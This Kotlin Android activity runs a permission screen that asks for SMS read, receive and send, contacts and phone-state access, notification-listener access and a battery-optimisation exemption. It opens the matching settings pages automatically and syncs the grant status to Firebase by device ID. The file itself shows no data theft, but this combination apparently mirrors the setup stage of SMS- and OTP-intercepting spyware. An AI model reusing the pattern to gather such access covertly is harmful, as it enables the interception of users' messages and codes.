package com.example.fast.ui

import android.Manifest
import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.animation.AccelerateDecelerateInterpolator
import android.view.animation.DecelerateInterpolator
import android.view.animation.OvershootInterpolator
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.example.fast.databinding.ActivityPermissionFlowBinding
import com.example.fast.util.PermissionFirebaseSync
import com.example.fast.util.PermissionManager
import com.google.firebase.Firebase
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.database
import com.prexoft.prexocore.goTo

/**
 * PermissionFlowActivity
 * 
 * Single screen showing all 7 required permissions with real-time status updates.
 * 
 * Permissions shown:
 * - 5 Runtime permissions: RECEIVE_SMS, READ_SMS, READ_CONTACTS, SEND_SMS, READ_PHONE_STATE
 * - 2 Special permissions: Notification Listener, Battery Optimization
 * 
 * Note: Default SMS App permission is no longer shown in UI (removed from permission flow)
 * 
 * Flow:
 * 1. User grants runtime permissions (single button click)
 * 2. User enables notification listener (settings redirect)
 * 3. User enables battery optimization (settings redirect)
 * 4. Continue to app when all permissions granted
 */
class PermissionFlowActivity : AppCompatActivity() {
    
    private val binding by lazy { ActivityPermissionFlowBinding.inflate(layoutInflater) }
    
    private val PERMISSION_REQUEST_CODE = 100
    private val EXTRA_FORCE_ACTIVATED = "forceActivated"
    
    @get:android.annotation.SuppressLint("HardwareIds")
    private val deviceId: String by lazy {
        android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }
    
    // Permission card views
    private val permissionCards = mutableMapOf<String, CardView>()
    private val permissionStatusViews = mutableMapOf<String, TextView>()
    
    // Track if we're auto-requesting permissions (to avoid opening settings multiple times)
    private var hasRequestedRuntimePermissions = false
    private var hasOpenedNotificationSettings = false
    private var hasOpenedBatterySettings = false
    private var hasOpenedDefaultSmsSettings = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        // Set window background to match app theme
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
        }
        
        setContentView(binding.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
        
        // Initialize permission card mappings
        initializePermissionCards()
        
        // Setup button listeners
        setupButtonListeners()
        
        // Start collapse animation
        binding.root.post {
            animateCollapseAndDeploy()
        }
        
        // Sync permission status to Firebase
        PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
        
        // Update UI with current permission status
        updatePermissionStatus()
        
        // Auto-request all mandatory permissions in first cycle
        // Use postDelayed to ensure UI is fully loaded before requesting
        binding.root.postDelayed({
            requestAllMandatoryPermissionsOnFirstLoad()
        }, 300) // Small delay to ensure UI is ready
        
        // Auto-navigate if all permissions are already granted
        checkAndAutoNavigate()
    }
    
    /**
     * Request all mandatory permissions automatically on first load
     * This ensures all permissions (runtime + special) are requested in the first cycle
     */
    private fun requestAllMandatoryPermissionsOnFirstLoad() {
        val status = PermissionManager.getAllPermissionsStatus(this)
        
        // Request all runtime permissions at once (first cycle)
        if (!status.runtimePermissions.values.all { it.isGranted }) {
            if (!hasRequestedRuntimePermissions) {
                hasRequestedRuntimePermissions = true
                requestRuntimePermissions()
            }
        }
        
        // Auto-open settings for special permissions if not granted
        // Check on resume will handle opening the next one after user returns
        checkAndOpenSpecialPermissionSettings()
        
        // Auto-open default SMS app settings if not set (MANDATORY)
        // Default SMS app settings check removed (no longer in UI)
    }
    
    /**
     * Check and open special permission settings if needed
     * Called on activity start and on resume (after returning from settings)
     */
    private fun checkAndOpenSpecialPermissionSettings() {
        val status = PermissionManager.getAllPermissionsStatus(this)
        
        // Open notification listener settings first if not granted and not already opened
        if (!status.notificationListener.isGranted && !hasOpenedNotificationSettings) {
            // Wait a bit for runtime permissions to be handled first
            binding.root.postDelayed({
                if (!isFinishing && !isDestroyed) {
                    val currentStatus = PermissionManager.getAllPermissionsStatus(this)
                    // Double-check it's still not granted (user might have granted it)
                    if (!currentStatus.notificationListener.isGranted && !hasOpenedNotificationSettings) {
                        hasOpenedNotificationSettings = true
                        android.util.Log.d("PermissionFlowActivity", "Auto-opening notification listener settings")
                        PermissionManager.openNotificationListenerSettings(this)
                    }
                }
            }, 1500) // 1.5 second delay after runtime permission request
            // Don't return early - allow battery check to also run if notification is already granted
        }
        
        // Open battery optimization settings if battery is not granted
        // Check independently - don't require notification to be granted first
        // Only show once - if user dismisses it, they can manually enable it via the button
        if (!status.batteryOptimization.isGranted && !hasOpenedBatterySettings) {
            // If notification is already granted, open battery settings immediately
            // Otherwise, wait a bit longer to avoid opening both settings at once
            val delay = if (status.notificationListener.isGranted) {
                500L // Small delay if notification is granted
            } else {
                2000L // Longer delay if notification is not granted yet (to avoid conflicts)
            }
            
            binding.root.postDelayed({
                if (!isFinishing && !isDestroyed) {
                    val currentStatus = PermissionManager.getAllPermissionsStatus(this)
                    // Double-check it's still not granted and we haven't already opened it
                    // Also check if it was granted in the meantime (user might have enabled it manually)
                    if (!currentStatus.batteryOptimization.isGranted && !hasOpenedBatterySettings) {
                        hasOpenedBatterySettings = true
                        android.util.Log.d("PermissionFlowActivity", "Auto-opening battery optimization settings")
                        PermissionManager.openBatteryOptimizationSettings(this)
                    } else if (currentStatus.batteryOptimization.isGranted) {
                        // User granted it manually, mark as opened so we don't try again
                        hasOpenedBatterySettings = true
                    }
                }
            }, delay)
        }
    }
    
    override fun onResume() {
        super.onResume()
        // Sync permission status to Firebase when returning from settings
        PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
        // Update status when returning from settings
        updatePermissionStatus()
        
        // Check if battery optimization was granted while user was away
        // If it was granted, we don't need to show the dialog again
        val status = PermissionManager.getAllPermissionsStatus(this)
        if (status.batteryOptimization.isGranted) {
            // Battery optimization is now granted, mark as opened so we don't try again
            hasOpenedBatterySettings = true
        }
        
        // Only check and open special permission settings if we haven't already opened them
        // This prevents repeatedly showing the battery optimization dialog after user enables background usage
        if (!hasOpenedBatterySettings || !hasOpenedNotificationSettings) {
            checkAndOpenSpecialPermissionSettings()
        }
        
        // Default SMS app settings auto-open removed (no longer in UI)
        
        // Auto-navigate if all permissions are now granted
        checkAndAutoNavigate()
    }
    
    /**
     * Check if all permissions are granted and auto-navigate if so
     */
    private fun checkAndAutoNavigate() {
        val status = PermissionManager.getAllPermissionsStatus(this)
        if (status.allGranted) {
            // All permissions granted - auto-navigate after a short delay
            binding.root.postDelayed({
                if (!isFinishing && !isDestroyed) {
                    navigateToNextActivity()
                }
            }, 500) // Small delay to show the UI update
        }
    }
    
    /**
     * Initialize permission card views
     */
    private fun initializePermissionCards() {
        // Runtime permissions
        permissionCards[Manifest.permission.RECEIVE_SMS] = binding.permissionCardReceiveSms
        permissionCards[Manifest.permission.READ_SMS] = binding.permissionCardReadSms
        permissionCards[Manifest.permission.READ_CONTACTS] = binding.permissionCardReadContacts
        permissionCards[Manifest.permission.SEND_SMS] = binding.permissionCardSendSms
        permissionCards[Manifest.permission.READ_PHONE_STATE] = binding.permissionCardReadPhoneState
        
        // Special permissions (use special keys)
        permissionCards["notification_listener"] = binding.permissionCardNotificationListener
        permissionCards["battery_optimization"] = binding.permissionCardBatteryOptimization
        // Default SMS app card removed from UI
        
        // Status views
        permissionStatusViews[Manifest.permission.RECEIVE_SMS] = binding.permissionStatusReceiveSms
        permissionStatusViews[Manifest.permission.READ_SMS] = binding.permissionStatusReadSms
        permissionStatusViews[Manifest.permission.READ_CONTACTS] = binding.permissionStatusReadContacts
        permissionStatusViews[Manifest.permission.SEND_SMS] = binding.permissionStatusSendSms
        permissionStatusViews[Manifest.permission.READ_PHONE_STATE] = binding.permissionStatusReadPhoneState
        permissionStatusViews["notification_listener"] = binding.permissionStatusNotificationListener
        permissionStatusViews["battery_optimization"] = binding.permissionStatusBatteryOptimization
        // Default SMS app status view removed from UI
    }
    
    /**
     * Setup button click listeners
     */
    private fun setupButtonListeners() {
        // Grant all runtime permissions
        binding.grantRuntimePermissionsButton.setOnClickListener {
            requestRuntimePermissions()
        }
        
        // Enable notification listener
        binding.enableNotificationListenerButton.setOnClickListener {
            PermissionManager.openNotificationListenerSettings(this)
        }
        
        // Enable battery optimization
        binding.enableBatteryOptimizationButton.setOnClickListener {
            PermissionManager.openBatteryOptimizationSettings(this)
        }
        
        // Default SMS app button removed from UI
        
        // Continue to app
        binding.continueButton.setOnClickListener {
            navigateToNextActivity()
        }
    }
    
    /**
     * Request all runtime permissions at once (first cycle)
     * This requests all mandatory permissions together instead of sequentially
     */
    private fun requestRuntimePermissions() {
        // Request ALL missing runtime permissions at once in first cycle
        // This is more efficient and faster than sequential requests
        val missingPermissions = PermissionManager.getMissingRuntimePermissions(this)
        
        if (missingPermissions.isEmpty()) {
            // All permissions already granted
            PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
            updatePermissionStatus()
            return
        }
        
        // Request all missing permissions at once
        android.util.Log.d("PermissionFlowActivity", "Requesting ${missingPermissions.size} permissions at once: $missingPermissions")
        PermissionManager.requestAllRuntimePermissions(this, PERMISSION_REQUEST_CODE)
    }
    
    /**
     * Handle permission request result
     * All permissions were requested at once, so we just need to update status
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // All permissions were requested at once, just update status
            // Sync permission status to Firebase
            PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
            // Update UI with new permission status
            updatePermissionStatus()
            
            // Log results
            permissions.forEachIndexed { index, permission ->
                val granted = index < grantResults.size && grantResults[index] == PackageManager.PERMISSION_GRANTED
                android.util.Log.d("PermissionFlowActivity", "Permission $permission: ${if (granted) "GRANTED" else "DENIED"}")
            }
            
            // Check if all permissions are now granted
            if (PermissionManager.hasAllRuntimePermissions(this)) {
                android.util.Log.d("PermissionFlowActivity", "All runtime permissions granted!")
                // Auto-navigate if all permissions are granted (including special permissions)
                checkAndAutoNavigate()
            } else {
                // Some permissions denied - user can retry by clicking the button again
                android.util.Log.d("PermissionFlowActivity", "Some permissions denied, user can retry")
            }
        }
    }
    
    /**
     * Update permission status UI
     */
    private fun updatePermissionStatus() {
        val status = PermissionManager.getAllPermissionsStatus(this)
        
        // Update runtime permissions
        status.runtimePermissions.forEach { (permission, permissionStatus) ->
            updatePermissionCard(permission, permissionStatus.isGranted)
        }
        
        // Update notification listener
        updatePermissionCard("notification_listener", status.notificationListener.isGranted)
        
        // Update battery optimization
        updatePermissionCard("battery_optimization", status.batteryOptimization.isGranted)
        
        // Default SMS app card removed from UI (no longer shown)
        
        // Update progress text (7-8 permissions: 5-6 runtime + 2 special, depending on Android version)
        val grantedCount = PermissionManager.getGrantedPermissionsCount(this)
        val totalCount = PermissionManager.getRequiredRuntimePermissions(this).size + 2 // Runtime + 2 special
        val remainingCount = totalCount - grantedCount
        binding.progressText.text = "$grantedCount / $totalCount granted • $remainingCount left"
        binding.subtitleText.text = if (remainingCount == 0) {
            "All permissions granted"
        } else {
            "Grant the remaining $remainingCount permissions to continue"
        }
        
        // Update continue button state
        updateContinueButton(status.allGranted)
        
        // Update button visibility based on status
        updateButtonVisibility(status)
    }
    
    /**
     * Update individual permission card status
     */
    private fun updatePermissionCard(key: String, isGranted: Boolean) {
        val statusView = permissionStatusViews[key] ?: return
        
        statusView.text = if (isGranted) "✅" else "⏳"
        
        // Optional: Add animation when permission is granted
        if (isGranted) {
            statusView.animate()
                .scaleX(1.2f)
                .scaleY(1.2f)
                .setDuration(200)
                .withEndAction {
                    statusView.animate()
                        .scaleX(1.0f)
                        .scaleY(1.0f)
                        .setDuration(200)
                        .start()
                }
                .start()
        }
    }
    
    /**
     * Update continue button state
     */
    private fun updateContinueButton(allGranted: Boolean) {
        binding.continueButton.isEnabled = true
        binding.continueButton.alpha = if (allGranted) 1.0f else 0.5f
        
        // Update button text if all granted (find TextView inside FrameLayout)
        val textView = binding.continueButton.getChildAt(0) as? TextView
        if (allGranted && textView != null) {
            textView.text = "🎉 Continue to App"
        } else if (textView != null) {
            textView.text = "Continue to App"
        }
    }
    
    /**
     * Update button visibility based on permission status
     */
    private fun updateButtonVisibility(status: PermissionManager.AllPermissionsStatus) {
        // Show/hide grant runtime permissions button
        val allRuntimeGranted = status.runtimePermissions.values.all { it.isGranted }
        binding.grantRuntimePermissionsButton.visibility = if (allRuntimeGranted) View.GONE else View.VISIBLE
        
        // Show/hide notification listener button
        binding.enableNotificationListenerButton.visibility = 
            if (status.notificationListener.isGranted) View.GONE else View.VISIBLE
        
        // Show/hide battery optimization button
        binding.enableBatteryOptimizationButton.visibility = 
            if (status.batteryOptimization.isGranted) View.GONE else View.VISIBLE
        
        // Default SMS app button removed from UI
    }
    
    /**
     * Navigate to next activity
     * Default SMS app check removed from UI (no longer blocking navigation)
     */
    private fun navigateToNextActivity() {
        if (intent.getBooleanExtra(EXTRA_FORCE_ACTIVATED, false)) {
            startActivity(buildActivatedIntentFromExtras())
            finish()
            return
        }

        // Check activation status (similar to SplashActivity)
        checkActivationStatus { isActivated ->
            val nextIntent = if (isActivated) {
                buildActivatedIntentFromExtras()
            } else {
                Intent(this, ActivationActivity::class.java)
            }
            startActivity(nextIntent)
            finish()
        }
    }

    private fun buildActivatedIntentFromExtras(): Intent {
        val activatedIntent = Intent(this, ActivatedActivity::class.java)
        if (intent.hasExtra("phone")) {
            activatedIntent.putExtra("phone", intent.getStringExtra("phone"))
        }
        if (intent.hasExtra("code")) {
            activatedIntent.putExtra("code", intent.getStringExtra("code"))
        }
        if (intent.hasExtra("activationMode")) {
            activatedIntent.putExtra("activationMode", intent.getStringExtra("activationMode"))
        }
        if (intent.hasExtra("activationApiStatus")) {
            activatedIntent.putExtra("activationApiStatus", intent.getStringExtra("activationApiStatus"))
        }
        if (intent.hasExtra("activationFirebaseStatus")) {
            activatedIntent.putExtra("activationFirebaseStatus", intent.getStringExtra("activationFirebaseStatus"))
        }
        if (intent.hasExtra("animate")) {
            activatedIntent.putExtra("animate", intent.getBooleanExtra("animate", false))
        }
        return activatedIntent
    }
    
    /**
     * Check activation status from Firebase
     */
    private fun checkActivationStatus(callback: (Boolean) -> Unit) {
        val deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
        
        Firebase.database.reference.child(AppConfig.getFirebasePath(deviceId, AppConfig.FirebasePaths.IS_ACTIVE))
            .addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val isActive = snapshot.getValue(String::class.java) ?: ""
                    callback(isActive == "Opened")
                }
                
                override fun onCancelled(error: DatabaseError) {
                    // On error, assume not activated (safe default)
                    callback(false)
                }
            })
    }
    
    /**
     * Animate collapse to center, show logo, then deploy cards
     */
    private fun animateCollapseAndDeploy() {
        try {
            val handler = Handler(Looper.getMainLooper())
            val screenCenterX = resources.displayMetrics.widthPixels / 2f
            val screenCenterY = resources.displayMetrics.heightPixels / 2f
            
            // Get all views to collapse
            val headerSection = binding.headerSection
            val scrollView = binding.scrollView
            val actionButtonsLayout = binding.actionButtonsLayout
            val logoView = binding.logoTextView
            
            // Calculate center positions
            val headerCenterX = screenCenterX - headerSection.width / 2f
            val headerCenterY = screenCenterY - headerSection.height / 2f
            val scrollCenterX = screenCenterX - scrollView.width / 2f
            val scrollCenterY = screenCenterY - scrollView.height / 2f
            val buttonsCenterX = screenCenterX - actionButtonsLayout.width / 2f
            val buttonsCenterY = screenCenterY - actionButtonsLayout.height / 2f
            
            // Step 1: Collapse all elements to center (600ms)
            val collapseAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(headerSection, "translationX", 0f, headerCenterX - headerSection.x),
                    ObjectAnimator.ofFloat(headerSection, "translationY", 0f, headerCenterY - headerSection.y),
                    ObjectAnimator.ofFloat(headerSection, "scaleX", 1f, 0f),
                    ObjectAnimator.ofFloat(headerSection, "scaleY", 1f, 0f),
                    ObjectAnimator.ofFloat(headerSection, "alpha", 1f, 0f),
                    ObjectAnimator.ofFloat(scrollView, "translationX", 0f, scrollCenterX - scrollView.x),
                    ObjectAnimator.ofFloat(scrollView, "translationY", 0f, scrollCenterY - scrollView.y),
                    ObjectAnimator.ofFloat(scrollView, "scaleX", 1f, 0f),
                    ObjectAnimator.ofFloat(scrollView, "scaleY", 1f, 0f),
                    ObjectAnimator.ofFloat(scrollView, "alpha", 1f, 0f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "translationX", 0f, buttonsCenterX - actionButtonsLayout.x),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "translationY", 0f, buttonsCenterY - actionButtonsLayout.y),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "scaleX", 1f, 0f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "scaleY", 1f, 0f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "alpha", 1f, 0f)
                )
                duration = 600
                interpolator = DecelerateInterpolator()
            }
            
            // Step 2: Show logo in center and scale up (400ms)
            val logoShowAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(logoView, "alpha", 0f, 1f),
                    ObjectAnimator.ofFloat(logoView, "scaleX", 0.5f, 1.2f),
                    ObjectAnimator.ofFloat(logoView, "scaleY", 0.5f, 1.2f)
                )
                duration = 400
                startDelay = 600
                interpolator = OvershootInterpolator(1.5f)
            }
            
            // Step 3: Logo moves up (400ms)
            val logoMoveUpAnimator = ObjectAnimator.ofFloat(logoView, "translationY", 0f, -screenCenterY * 0.3f).apply {
                duration = 400
                startDelay = 1000
                interpolator = DecelerateInterpolator()
            }
            
            // Step 4: Deploy cards from center (800ms)
            val deployAnimator = AnimatorSet().apply {
                playTogether(
                    // Header deploy
                    ObjectAnimator.ofFloat(headerSection, "translationX", headerCenterX - headerSection.x, 0f),
                    ObjectAnimator.ofFloat(headerSection, "translationY", headerCenterY - headerSection.y, 0f),
                    ObjectAnimator.ofFloat(headerSection, "scaleX", 0f, 1f),
                    ObjectAnimator.ofFloat(headerSection, "scaleY", 0f, 1f),
                    ObjectAnimator.ofFloat(headerSection, "alpha", 0f, 1f),
                    // ScrollView deploy
                    ObjectAnimator.ofFloat(scrollView, "translationX", scrollCenterX - scrollView.x, 0f),
                    ObjectAnimator.ofFloat(scrollView, "translationY", scrollCenterY - scrollView.y, 0f),
                    ObjectAnimator.ofFloat(scrollView, "scaleX", 0f, 1f),
                    ObjectAnimator.ofFloat(scrollView, "scaleY", 0f, 1f),
                    ObjectAnimator.ofFloat(scrollView, "alpha", 0f, 1f),
                    // Buttons deploy
                    ObjectAnimator.ofFloat(actionButtonsLayout, "translationX", buttonsCenterX - actionButtonsLayout.x, 0f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "translationY", buttonsCenterY - actionButtonsLayout.y, 0f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "scaleX", 0f, 1f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "scaleY", 0f, 1f),
                    ObjectAnimator.ofFloat(actionButtonsLayout, "alpha", 0f, 1f)
                )
                duration = 800
                startDelay = 1400
                interpolator = OvershootInterpolator(1.2f)
            }
            
            // Hide logo after deploy starts
            val logoHideAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(logoView, "alpha", 1f, 0f),
                    ObjectAnimator.ofFloat(logoView, "scaleX", 1.2f, 0.5f),
                    ObjectAnimator.ofFloat(logoView, "scaleY", 1.2f, 0.5f)
                )
                duration = 300
                startDelay = 1400
            }
            
            // Show logo initially
            logoView.visibility = View.VISIBLE
            
            // Start animations
            collapseAnimator.start()
            logoShowAnimator.start()
            logoMoveUpAnimator.start()
            deployAnimator.start()
            logoHideAnimator.start()
            
        } catch (e: Exception) {
            android.util.Log.e("PermissionFlowActivity", "Error in collapse animation", e)
            // If animation fails, ensure elements are visible
            binding.headerSection.alpha = 1f
            binding.scrollView.alpha = 1f
            binding.actionButtonsLayout.alpha = 1f
            binding.logoTextView.visibility = View.INVISIBLE
        }
    }
}

